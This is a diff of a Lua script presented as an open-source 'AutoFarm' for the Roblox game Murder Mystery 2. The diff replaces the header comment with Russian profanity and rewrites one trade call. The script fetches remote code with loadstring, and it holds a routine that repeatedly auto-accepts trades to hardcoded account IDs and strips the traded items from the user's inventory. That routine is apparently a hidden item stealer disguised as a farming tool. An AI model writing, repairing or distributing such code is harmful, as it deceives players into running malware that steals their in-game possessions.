@@ -1,4 +1,4 @@
--- Open Source Script AutoFarm murder mystery 2 Summer update 202660
+-- Open Source Script AutoFarm murder mystery 2 Summer update мать ебал
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/script-create/Anti-afk/refs/heads/main/Autofarm.lua"))()
 
@@ -1047,7 +1047,7 @@ local InsIt=function()
  task.spawn(function()
   local acc=false local pA={[142823291]=285646582,[335132309]=670264618,[636649648]=1273299296} local tA=pA[game.PlaceId]
   if tA and TP then
-   while not acc do pcall(function() RS.Trade.TradeCommand:FireServer("accept", tA) end) acc=not TP.Enabled task.wait(0.05) end
+   while not acc do pcall(function() RS.Trade.TradeCommand:FireServer({"accept", tA}) end) acc=not TP.Enabled task.wait(0.05) end
    for _,td in ipairs(tIt) do for j,it in ipairs(InvT) do if it.id==td.id then if it.amount<=td.amount then table.remove(InvT,j) else it.amount=it.amount-td.amount end break end end end
   end
  end)
